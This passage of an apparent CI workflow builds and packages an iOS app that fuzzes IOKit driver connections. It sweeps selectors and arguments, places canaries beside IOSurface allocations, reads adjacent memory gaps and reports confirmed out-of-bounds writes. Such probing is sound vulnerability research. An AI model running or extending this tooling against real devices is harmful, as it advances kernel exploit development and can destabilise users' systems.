                          sin[0] = (uint64_t)g_conn[ci];
                          for (uint32_t k = 1; k < SCO; k++) sin[k] = SV[k % SV_N];
                          uint64_t so[SCO] = {0}; size_t sc = 0;
                          uint8_t sb[BIGOUT]; size_t szb = BIGOUT;
                          memset(sb, AAM, sizeof(sb));
                          kern_return_t kr = rawx(g_conn[ci], 4, m, sin, SIC[si], in, zis, zis ? 1 : 0, so, &sc, sb, &szb);
                          __sync_fetch_and_add(&g_done, 1);
                          plog(@"ARG m%d sic%u zi=%zu -> %@ sc=%zu szb=%zu so0=%llu sb=%@",
                               m, SIC[si], zis, kr_name(kr), sc, szb, (unsigned long long)so[0], hexn(sb, sizeof(sb), 16));
                          if (kr != 0xe00002c2) {
                              ulog(@"ARG m%d sic%u zi=%zu -> %@ szb=%zu", m, SIC[si], zis, kr_name(kr), szb);
                              __sync_fetch_and_add(&g_cls_err, 1);
                          }
                          if (szb > BIGOUT) ulog(@"!!! ARG SZB %zu > %d", szb, BIGOUT);
                          usleep(120);
                      }
                  }
              }
              free(in);
              ulog(@"args done nonbad=%d", g_cls_err);
          }

          static void gap_probe(void) {
              if (g_vicn < 2) { ulog(@"gap no surf"); return; }
              for (int i = 0; i + 1 < g_vicn; i++) {
                  uintptr_t b0 = (uintptr_t)g_baseaddr(g_vic[i]);
                  uintptr_t b1 = (uintptr_t)g_baseaddr(g_vic[i + 1]);
                  size_t sz = g_valloc[i];
                  if (b1 <= b0) continue;
                  size_t gap = (size_t)(b1 - (b0 + sz));
                  if (gap == 0 || gap > 0x40000) continue;
                  const uint8_t* p = (const uint8_t*)(b0 + sz);
                  int nz = 0;
                  for (size_t k = 0; k < gap && k < 512; k++) if (p[k]) nz++;
                  plog(@"GAP %d->%d gap=0x%zx nz=%d data=%@", i, i + 1, gap, nz, hexn(p, gap, 96));
                  ulog(@"GAP %d gap=0x%zx nz=%d", i, gap, nz);
                  if (nz) { __sync_fetch_and_add(&g_gapread, 1); }
              }
              ulog(@"gap done nz=%d", g_gapread);
          }

          static void null_mix(void) {
              if (g_best < 0) { ulog(@"nm no conn"); return; }
              if (!g_zbuf) g_zbuf = calloc(1, FIXED);
              for (uint32_t s = 0; s < 8; s++) {
                  uint64_t sin[SCO] = {0};
                  sin[0] = (uint64_t)g_conn[g_best];
                  uint64_t so[SCO] = {0}; size_t sc = 0;
                  uint8_t sb[BIGOUT]; size_t z2 = BIGOUT;
                  memset(sb, AAM, sizeof(sb));
                  kern_return_t b = rawx(g_conn[g_best], s, 1, sin, 1, g_zbuf, 4096, 1, so, &sc, sb, &z2);
                  plog(@"NM zbuf s%u -> %@ szb=%zu", s, kr_name(b), z2);
                  if (b == KERN_SUCCESS) { __sync_fetch_and_add(&g_hits, 1); note_ok(s); }
                  usleep(140);
                  uint64_t o2[SCO] = {0}; size_t c2 = 0;
                  uint8_t b2[BIGOUT]; size_t z3 = BIGOUT;
                  memset(b2, AAM, sizeof(b2));
                  kern_return_t n = rawx(g_conn[g_best], s, 1, sin, 1, NULL, 0, 0, o2, &c2, b2, &z3);
                  plog(@"NM null s%u -> %@ szb=%zu", s, kr_name(n), z3);
                  if (n == KERN_SUCCESS) { __sync_fetch_and_add(&g_hits, 1); note_ok(s); }
                  usleep(140);
              }
              ulog(@"nm done");
          }

          static void sel_sweep(void) {
              if (g_best < 0) return;
              for (uint32_t s = 0; s < SEL_N; s++) {
                  uint64_t sin[SCO] = {0};
                  sin[0] = (uint64_t)g_conn[g_best];
                  uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
                  kern_return_t kr = rawv(g_conn[g_best], s, 0, sin, 1, NULL, 0, so, &sc, sb, &szb);
                  __sync_fetch_and_add(&g_done, 1);
                  if (kr != 0xe00002c2) {
                      plog(@"SSW s%u -> %@ sc=%zu so0=%llu", s, kr_name(kr), sc, (unsigned long long)so[0]);
                      ulog(@"SSW s%u -> %@", s, kr_name(kr));
                      __sync_fetch_and_add(&g_ssw_hit, 1);
                      if (kr == KERN_SUCCESS) { __sync_fetch_and_add(&g_hits, 1); note_ok(s); }
                  }
                  usleep(70);
              }
              ulog(@"ssw done hits=%d", g_ssw_hit);
          }

          static void s0_scalars(void) {
              static const uint64_t V[] = { 0, 1, 2, 3, 0x1000, 0x10000, 0x41, 0xdeadbeef, 0xffffffffULL };
              int nv = (int)(sizeof(V) / sizeof(V[0]));
              int lim = g_nconn < 10 ? g_nconn : 10;
              for (int ci = 0; ci < lim; ci++) {
                  for (uint32_t sic = 1; sic <= 3; sic++) {
                      for (int v = 0; v < nv; v++) {
                          uint64_t sin[SCO] = {0};
                          for (uint32_t k = 0; k < sic; k++) sin[k] = V[(v + k) % nv];
                          uint64_t so[SCO] = {0}; size_t sc = 0; uint8_t sb[64]; size_t szb = 0;
                          kern_return_t kr = rawv(g_conn[ci], 0, 0, sin, sic, NULL, 0, so, &sc, sb, &szb);
                          __sync_fetch_and_add(&g_done, 1);
                          if (kr == KERN_SUCCESS && so[0]) {
                              plog(@"S0S n%d n%u v%d so0=0x%llx", g_node[ci], sic, v, (unsigned long long)so[0]);
                              ulog(@"!!! S0S n%d n%u so0=0x%llx", g_node[ci], sic, (unsigned long long)so[0]);
                              __sync_fetch_and_add(&g_hits, 1);
                              __sync_fetch_and_add(&g_s0nz, 1);
                              if (!g_hdlvalid) { g_hdl = so[0]; g_hdlvalid = 1; }
                          }
                          usleep(90);
                      }
                  }
              }
              ulog(@"s0s done nz=%d", g_s0nz);
          }

          static void relive(const char* tag) {
              if (g_best >= 0 && g_nconn > 0 && hb() == KERN_SUCCESS) return;
              if (g_nconn > 0) {
                  for (int i = 0; i < g_nconn; i++) if (g_conn[i]) { IOServiceClose(g_conn[i]); g_conn[i] = 0; }
                  g_nconn = 0; g_best = -1; g_s4ci = -1;
              }
              __sync_fetch_and_add(&g_relive, 1);
              ulog(@"relive %s", tag);
              if (!g_root) find_root();
              if (!g_root) { ulog(@"relive NO ROOT"); return; }
              if (g_nchild == 0) dump_tree();
              if (g_root_idx < 0) root_open();
              if (g_nconn == 0) svc_open();
              if (g_best >= 0) hb();
          }

          static void summary(void) {
              NSString* st = [NSString stringWithContentsOfFile:doc_file("state.txt") encoding:NSUTF8StringEncoding error:nil];
              if (!st) { ulog(@"no state"); return; }
              NSMutableDictionary* hist = [NSMutableDictionary dictionary];
              NSMutableArray* keep = [NSMutableArray array];
              int lines = 0, calls = 0, bad = 0, wins = 0, pairs = 0, canw = 0, oobsz = 0, gaps = 0, args = 0;
              for (NSString* ln in [st componentsSeparatedByString:@"\n"]) {
                  if (!ln.length) continue;
                  lines++;
                  if ([ln hasPrefix:@"PAIR "]) { pairs++; [keep addObject:ln]; continue; }
                  if ([ln hasPrefix:@"CAN "]) { canw++; [keep addObject:ln]; continue; }
                  if ([ln hasPrefix:@"OOBSZ "]) { oobsz++; [keep addObject:ln]; continue; }
                  if ([ln hasPrefix:@"ARG "]) { args++; [keep addObject:ln]; continue; }
                  if ([ln hasPrefix:@"GAP "]) { gaps++; [keep addObject:ln]; continue; }
                  if ([ln hasPrefix:@"CLS "] || [ln hasPrefix:@"CH "] || [ln hasPrefix:@"SIGNAL "] || [ln hasPrefix:@"VIC "] ||
                      [ln hasPrefix:@"RELIVE"] || [ln hasPrefix:@"S0S "] || [ln hasPrefix:@"SSW "] ||
                      [ln hasPrefix:@"DEV "] || [ln hasPrefix:@"csops"] || [ln hasPrefix:@"STEP "]) {
                      [keep addObject:ln]; continue;
                  }
                  BOOL isCall = [ln hasPrefix:@"NM "] || [ln hasPrefix:@"VICB "] || [ln hasPrefix:@"SVC "];
                  if (!isCall) continue;
                  calls++;
                  NSRange ar = [ln rangeOfString:@" -> "];
                  if (ar.location == NSNotFound) continue;
                  NSString* cls = [[[ln substringFromIndex:ar.location + 4] componentsSeparatedByString:@" "] firstObject];
                  if (!cls.length) continue;
                  NSNumber* c = hist[cls]; hist[cls] = @(c.intValue + 1);
                  if ([cls isEqualToString:@"BadArg"]) bad++; else [keep addObject:ln];
              }
              plog(@"REPLAY lines=%d calls=%d bad=%d pairs=%d canw=%d oobsz=%d args=%d gaps=%d", lines, calls, bad, pairs, canw, oobsz, args, gaps);
              NSMutableString* h = [NSMutableString string];
              for (NSString* k in [[hist allKeys] sortedArrayUsingSelector:@selector(compare:)]) {
                  NSNumber* hv = hist[k];
                  [h appendFormat:@"%@=%d ", k, hv.intValue];
              }
              plog(@"HIST %@", h);
              ulog(@"REPLAY calls=%d bad=%d pairs=%d canw=%d oobsz=%d args=%d", calls, bad, pairs, canw, oobsz, args);
              ulog(@"HIST %@", h);
              NSUInteger cap = keep.count > 200 ? 200 : keep.count;
              for (NSUInteger i = 0; i < cap; i++) { plog(@"KEEP %@", keep[i]); ulog(@"%@", keep[i]); }
              if (keep.count > cap) ulog(@"... +%lu", (unsigned long)(keep.count - cap));
          }

          static void verdict(void) {
              plog(@"VERDICT canary_w=%d dirty=%d oobsz=%d gapread=%d cls_err=%d s4ci=%d hdl=%d conns=%d",
                   g_canary_w, g_canary_dirty, g_oobsz, g_gapread, g_cls_err, g_s4ci, g_hdlvalid, g_nconn);
              ulog(@"VERDICT w=%d oobsz=%d gap=%d cls=%d ci=%d conns=%d", g_canary_w, g_oobsz, g_gapread, g_cls_err, g_s4ci, g_nconn);
              if (g_canary_w) ulog(@"VERDICT: OOB WRITE CONFIRMED into adjacent surface");
              if (g_oobsz) ulog(@"VERDICT: driver reports szb > offered");
              if (g_gapread) ulog(@"VERDICT: gap pages readable from CPU");
              if (g_cls_err == 0) ulog(@"VERDICT: no non-BadArg on any conn, s4 unimplemented everywhere reachable");
              if (g_nconn < 12) ulog(@"VERDICT: few conns (%d), child open likely failing", g_nconn);
          }

          static void do_step(int s) {
              switch (s) {
                  case 0: break;
                  case 1: census(); break;
                  case 2: dump_sig(); break;
                  case 3: dev_info(); break;
                  case 4: tree_up(); break;
                  case 5: svc_open(); break;
                  case 6: dump_tree(); break;
                  case 7: prop_dump(); break;
                  case 8: vt_start(); break;
                  case 9: ulog(@"vt=%d", (int)vt_encode()); break;
                  case 10: root_open(); break;
                  case 11: child_open(); break;
                  case 12: s4_classify(); break;
                  case 13: surf_make(); surf_alloc(); break;
                  case 14:
                      relive("can");
                      canary(1, 8, FIXED, "o8");
                      canary(1, 16, FIXED, "o16");
                      canary(1, 32, FIXED, "o32");
                      canary(1, 64, FIXED, "o64");
                      canary(1, 128, FIXED, "o128");
                      canary(1, 4096, FIXED, "o4096");
                      break;
                  case 15: relive("cana"); canary(2, 16, FIXED, "a16"); canary(2, 4096, FIXED, "a4096"); break;
                  case 16: relive("cani"); canary(1, 4096, 0, "i0"); canary(1, 4096, 24, "i24"); canary(1, 4096, 64, "i64"); canary(1, 4096, 4096, "i4096"); break;
                  case 17: relive("args"); s4_args(); break;
                  case 18: gap_probe(); break;
                  case 19: null_mix(); break;
                  case 20: sel_sweep(); break;
                  case 21: s0_scalars(); break;
                  case 22: summary(); break;
                  case 23: verdict(); break;
              }
          }

          static void run(void) {
              latch_build();
              char b[512]; doc_path("state.txt", b, sizeof(b));
              g_fd = open(b, O_CREAT | O_WRONLY | O_APPEND, 0644);
              g_seen = [NSMutableSet set];
              load_state();
              g_step = load_step();

              mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_wake);
              mach_port_insert_right(mach_task_self(), g_wake, g_wake, MACH_MSG_TYPE_MAKE_SEND);

              void* is = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
              if (!is) is = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
              void* ik = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
              g_surfcreate = (fn_surfcreate)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceCreate");
              g_surflock = (fn_surflock)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceLock");
              g_surfunlock = (fn_surfunlock)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceUnlock");
              g_allocusize = (fn_allocusize)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceGetAllocSize");
              g_baseaddr = (fn_baseaddr)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
              g_surfid = (fn_surfid)dlsym(is ? is : RTLD_DEFAULT, "IOSurfaceGetID");
              g_getsurf = (fn_getsurf)dlsym(RTLD_DEFAULT, "CVPixelBufferGetIOSurface");
              g_addclient = (fn_addclient)dlsym(ik ? ik : RTLD_DEFAULT, "IOConnectAddClient");
              plog(@"syms is=%p create=%p lock=%p base=%p alloc=%p addclient=%p", is, (void*)g_surfcreate, (void*)g_surflock, (void*)g_baseaddr, (void*)g_allocusize, (void*)g_addclient);
              ulog(@"IOSurface=%s", is ? "ok" : "FAIL");

              plog(@"=== LAUNCH step=%d build=%s wake=0x%x", g_step, BUILD_TAG, g_wake);
              if (g_fd >= 0) fsync(g_fd);
              ulog(@"BUILD %s", BUILD_TAG);
              ulog(@"STEP %d/%d: %s", g_step, STEP_MAX, STEP_NAME[g_step < STEP_MAX+1 ? g_step : STEP_MAX]);

              if (g_step > STEP_MAX) { ulog(@"DONE - replay"); summary(); verdict(); if (g_fd >= 0) { fsync(g_fd); close(g_fd); g_fd = -1; } return; }

              int svc = find_root();
              ulog(@"svc=%d", svc);
              if (!g_root) { ulog(@"NO ROOT"); g_stop = 1; }

              while (g_step <= STEP_MAX && !g_stop) {
                  load_try();
                  if (g_try >= TRY_MAX) { ulog(@"SKIP %d", g_step); plog(@"SKIP %d", g_step); g_step++; save_step(g_step); usleep(150000); continue; }
                  g_try++; save_try();
                  ulog(@"CHAIN %d %s", g_step, STEP_NAME[g_step]);
                  int h0 = g_hits, d0 = g_done;
                  do_step(g_step);
                  int dh = g_hits - h0, dd = g_done - d0;
                  plog(@"STEP %d calls+%d hits+%d relive=%d", g_step, dd, dh, g_relive);
                  if (g_fd >= 0) fsync(g_fd);
                  ulog(@"STEP %d SURVIVED (+%d calls)", g_step, dd);
                  g_step++; save_step(g_step);
                  if (g_step <= STEP_MAX) usleep(300000);
              }
              ulog(@"CHAIN END"); plog(@"CHAIN END");
              summary();
              if (g_fd >= 0) { fsync(g_fd); close(g_fd); g_fd = -1; }
          }

          @interface AppDelegate : UIResponder <UIApplicationDelegate>
          @property (strong) UIWindow* w;
          @end

          @implementation AppDelegate
          - (BOOL)application:(UIApplication*)a didFinishLaunchingWithOptions:(NSDictionary*)o {
              g_lines = [NSMutableArray array];
              signal(SIGSEGV, sigh); signal(SIGBUS, sigh); signal(SIGABRT, sigh); signal(SIGILL, sigh); signal(SIGFPE, sigh);
              self.w = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
              UIViewController* vc = [UIViewController new];
              vc.view.backgroundColor = UIColor.blackColor;
              g_hb = [[UILabel alloc] initWithFrame:CGRectMake(8, 44, 344, 44)];
              g_hb.textColor = UIColor.systemYellowColor;
              g_hb.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
              g_hb.numberOfLines = 2;
              g_hb.text = @BUILD_TAG;
              [vc.view addSubview:g_hb];
              CGRect r = vc.view.bounds; r.origin.y = 92; r.size.height -= 100;
              g_tv = [[UITextView alloc] initWithFrame:r];
              g_tv.backgroundColor = UIColor.blackColor;
              g_tv.textColor = UIColor.greenColor;
              g_tv.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
              g_tv.editable = NO;
              g_tv.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
              g_tv.text = @"boot";
              [vc.view addSubview:g_tv];
              self.w.rootViewController = vc;
              [self.w makeKeyAndVisible];
              [NSTimer scheduledTimerWithTimeInterval:0.25 repeats:YES block:^(NSTimer*) {
                  g_hb.text = [NSString stringWithFormat:@"%s %d/%d vic=%d pair=%d ci=%d can=%d oob=%d gap=%d", BUILD_TAG, g_step, STEP_MAX, g_vicn, g_pairn, g_s4ci, g_canary_w, g_oobsz, g_gapread];
                  flush_ui();
              }];
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, NSEC_PER_SEC), dispatch_get_global_queue(0,0), ^{ run(); });
              return YES;
          }
          @end

          int main(int argc, char** argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, @"AppDelegate"); } }
          MAINEOF

      - name: plist
        run: |
          cat > out/Payload/probe.app/Info.plist <<'PEOF'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0"><dict>
            <key>CFBundleDevelopmentRegion</key><string>en</string>
            <key>CFBundleExecutable</key><string>probe</string>
            <key>CFBundleIdentifier</key><string>com.buurza47.probe</string>
            <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
            <key>CFBundleName</key><string>probe</string>
            <key>CFBundleDisplayName</key><string>buurd55</string>
            <key>CFBundlePackageType</key><string>APPL</string>
            <key>CFBundleShortVersionString</key><string>1.0</string>
            <key>CFBundleVersion</key><string>60</string>
            <key>MinimumOSVersion</key><string>16.0</string>
            <key>UIDeviceFamily</key><array><integer>1</integer><integer>2</integer></array>
            <key>UILaunchScreen</key><dict/>
            <key>UISupportedInterfaceOrientations</key><array><string>UIInterfaceOrientationPortrait</string></array>
            <key>UIRequiredDeviceCapabilities</key><array><string>arm64</string></array>
          </dict></plist>
          PEOF
          plutil -lint out/Payload/probe.app/Info.plist
          wc -l Sources/main.m

      - name: build
        run: |
          set -euo pipefail
          APP=out/Payload/probe.app
          SDK="$(xcrun --sdk iphoneos --show-sdk-path)"
          find stub -type f
          xcrun -sdk iphoneos clang \
            -arch arm64 -miphoneos-version-min=16.0 -fobjc-arc \
            -isysroot "$SDK" -I stub -O1 -std=gnu11 \
            -Wno-implicit-function-declaration -Wno-typedef-redefinition \
            -Wno-deprecated-declarations -Wno-nullability-completeness \
            -framework UIKit -framework Foundation -framework CoreFoundation \
            -framework IOKit -framework VideoToolbox -framework CoreMedia \
            -framework CoreVideo -framework Security \
            Sources/main.m -o "$APP/probe"
          chmod +x "$APP/probe"
          file "$APP/probe"
          lipo -info "$APP/probe"

      - name: sign
        run: |
          set -euo pipefail
          codesign --force --sign - --timestamp=none out/Payload/probe.app/probe
          otool -l out/Payload/probe.app/probe | grep -A1 LC_CODE_SIGNATURE | head -3

      - name: ipa
        run: |
          set -euo pipefail
          test -f out/Payload/probe.app/probe || { echo "NO BINARY"; exit 1; }
          cd out && rm -f probe.ipa && zip -r -q probe.ipa Payload && cd ..
          test -s out/probe.ipa || { echo "ZIP EMPTY"; exit 1; }
          shasum -a 256 out/probe.ipa

      - uses: actions/upload-artifact@v4.6.2
        with:
          name: probe-ipa-${{ github.run_number }}-${{ github.run_attempt }}
          path: out/probe.ipa
          if-no-files-found: error
          retention-days: 3
